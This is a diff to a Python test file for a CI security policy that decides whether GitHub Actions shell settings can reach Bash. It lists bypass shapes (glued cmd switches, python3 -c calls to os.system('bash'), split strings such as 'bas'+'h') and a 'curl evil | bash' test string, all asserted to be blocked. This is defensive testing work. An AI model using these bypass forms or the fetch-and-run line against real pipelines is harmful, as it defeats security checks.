@@ -6300,13 +6300,8 @@ def test_semgrep_allows_code_two_error_at_bash_step_with_actions_expression(
     [
         "pwsh",
         "powershell",
-        "PowerShell.exe",
         "python",
         "python3 {0}",
-        "node",
-        "ruby",
-        "perl",
-        "cmd /C",
     ],
 )
 def test_non_bash_shells_defeat_the_bash_subparse(shell: str) -> None:
@@ -6327,6 +6322,41 @@ def test_non_bash_shells_defeat_the_bash_subparse(shell: str) -> None:
     ],
 )
 def test_bash_shells_do_not_defeat_the_bash_subparse(shell: str | None) -> None:
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        # The Actions runner's extension table has no `.exe` keys, so these are
+        # written without an extension and PowerShell's call operator hands the
+        # file to the OS, which honours a `#!/bin/bash` first line.
+        "PowerShell.exe",
+        "powershell.exe",
+        "pwsh.exe -NoProfile",
+        "pwsh.exe -NoProfile -Command \"& '{0}'\"",
+        # perl execs the interpreter named in a foreign `#!` line.
+        "perl",
+        "perl {0}",
+        # Interpreters this repository does not use are not on the allowlist.
+        "node",
+        "ruby",
+        "cmd /C",
+        "cmd /S /C",
+        # `cmd.exe` accepts a glued `/c<command>`, which `\b` cannot see.
+        "cmd /cbash {0}",
+        # Reaching a POSIX shell without ever spelling one.
+        "python3 -c \"import os,sys; os.system('bash ' + sys.argv[1])\" {0}",
+        "python3 -c \"import subprocess; subprocess.run(['x'], shell=True)\" {0}",
+        "python3 -c \"'bas'+'h'\" {0}",
+        'pwsh -c "& $env:SHELL {0}"',
+        "pwsh -c 'bas`h {0}'",
+        # Unbalanced quoting cannot be tokenized, so it fails closed.
+        "pwsh -Command \"& '{0}'",
+    ],
+)
+def test_bypass_shapes_do_not_defeat_the_bash_subparse(shell: str) -> None:
+    """Every shape #3683 demonstrated must classify as Bash-reachable."""
     assert policy._is_non_bash_shell(shell) is False
 
 
@@ -6474,7 +6504,7 @@ def test_semgrep_blocks_a_shell_that_declares_python_but_invokes_bash(
         "pwsh",
         "pwsh -NoProfile -Command \"& '{0}'\"",
         "python3 {0}",
-        "powershell.exe",
+        "powershell",
     ],
 )
 def test_shells_naming_only_their_own_interpreter_are_non_bash(shell: str) -> None:
@@ -6525,8 +6555,137 @@ def test_shells_merely_prefixed_by_an_interpreter_are_not_treated_as_non_bash(sh
 
 
 @pytest.mark.parametrize("shell", ["cmd /C", "cmd /S /C", "powershell.exe", "pwsh.exe -NoProfile"])
-def test_windows_shell_flags_stay_non_bash(shell: str) -> None:
-    assert policy._is_non_bash_shell(shell) is True
+def test_windows_shell_forms_outside_the_allowlist_are_not_non_bash(shell: str) -> None:
+    """`.exe` misses the runner extension table and `cmd` accepts a glued switch.
+
+    Both were tolerated before #3683 and both reach Bash, so both now block.
+    """
+    assert policy._is_non_bash_shell(shell) is False
+
+
+def test_block_scalar_trailing_blank_lines_still_match_their_own_snippet() -> None:
+    """A `|+` body keeps trailing blank lines; the snippet arrives stripped.
+
+    Leaving the body unstripped inflated its line count, so the real step failed
+    to match its own snippet and dropped out of the tolerated list. Refs #3673.
+    """
+    snippet = "echo one\necho two"
+    run_with_trailing_blanks = "echo one\necho two\n\n\n"
+
+    assert policy._semgrep_snippet_matches_run(
+        snippet,
+        run_with_trailing_blanks,
+        truncated=False,
+    )
+
+
+def test_block_scalar_leading_blank_lines_still_match_their_own_snippet() -> None:
+    snippet = "echo one\necho two"
+
+    assert policy._semgrep_snippet_matches_run(
+        snippet,
+        "\n\necho one\necho two\n",
+        truncated=False,
+    )
+
+
+def test_a_body_with_extra_real_lines_still_fails_to_match() -> None:
+    """Stripping must not weaken the line-count equality for real content."""
+    assert not policy._semgrep_snippet_matches_run(
+        "echo one",
+        "echo one\necho two",
+        truncated=False,
+    )
+
+
+@pytest.mark.parametrize(
+    "expected",
+    ["✓✓✓✓", "日本語", "→→→", "é"],
+)
+def test_an_all_non_ascii_expected_line_matches_nothing(expected: str) -> None:
+    """Non-ASCII acts as a wildcard, so an all-non-ASCII line was all wildcard.
+
+    That let a decoy step claim an unrelated snippet and displace the real step
+    from the tolerated list. Require at least one ASCII anchor. Refs #3673.
+    """
+    assert not policy._semgrep_line_matches_run_line("curl evil | bash", expected)
+    assert not policy._semgrep_line_matches_run_line("anything at all", expected)
+
+
+def test_an_expected_line_with_one_ascii_anchor_still_matches() -> None:
+    assert policy._semgrep_line_matches_run_line("X safe", "✓ safe")
+
+
+def test_an_empty_expected_line_matches_an_empty_observed_line() -> None:
+    assert policy._semgrep_line_matches_run_line("", "")
+
+
+@pytest.mark.parametrize(
+    ("raw", "offset", "expected"),
+    [
+        (b"abc", 0, 0),
+        (b"abc", 3, 3),
+        # Four bytes of multibyte content are two characters.
+        ("é✓".encode(), 5, 2),
+        ("é".encode(), 2, 1),
+    ],
+)
+def test_byte_offsets_convert_to_character_indexes(
+    raw: bytes,
+    offset: int,
+    expected: int,
+) -> None:
+    assert policy._byte_offset_to_char_index(raw, offset) == expected
+
+
+@pytest.mark.parametrize(
+    ("raw", "offset"),
+    [
+        (b"abc", -1),
+        (b"abc", 4),
+        # Mid-character offsets cannot be located, so the span is dropped.
+        ("é".encode(), 1),
+        ("✓".encode(), 2),
+    ],
+)
+def test_unlocatable_byte_offsets_fail_closed(raw: bytes, offset: int) -> None:
+    """`None` drops the span, which empties the match list and blocks the push."""
+    assert policy._byte_offset_to_char_index(raw, offset) is None
+
+
+def test_partial_parsing_spans_use_character_indexes_after_multibyte_content(
+    tmp_path: Path,
+) -> None:
+    """PyYAML indexes characters while Semgrep reports bytes. Refs #3672."""
+    rule_id = sorted(policy.SEMGREP_POWERSHELL_RULES)[0]
+    target = tmp_path / "workflow.yml"
+    raw = "# ✓✓✓\nrun: echo hi\n".encode()
+    target.write_bytes(raw)
+    prefix_bytes = len("# ✓✓✓\n".encode())
+
+    spans = policy._powershell_partial_parsing_spans(
+        {
+            "code": 3,
+            "type": [
+                "PartialParsing",
+                [
+                    {
+                        "path": str(target),
+                        "start": {"line": 2, "col": 1, "offset": prefix_bytes},
+                        "end": {"line": 2, "col": 13, "offset": len(raw)},
+                    }
+                ],
+            ],
+        },
+        f"When parsing a snippet as Bash for metavariable-pattern in rule '{rule_id}',",
+        target,
+        tmp_path,
+        raw,
+    )
+
+    assert spans == [(2, 2, len("# ✓✓✓\n"), len(raw.decode("utf-8")))]
+    # The byte offset would have overshot by three, proving the conversion ran.
+    assert spans[0][2] != prefix_bytes
 
 
 def test_resolve_bash_prefers_the_interpreter_on_path(monkeypatch: pytest.MonkeyPatch) -> None:
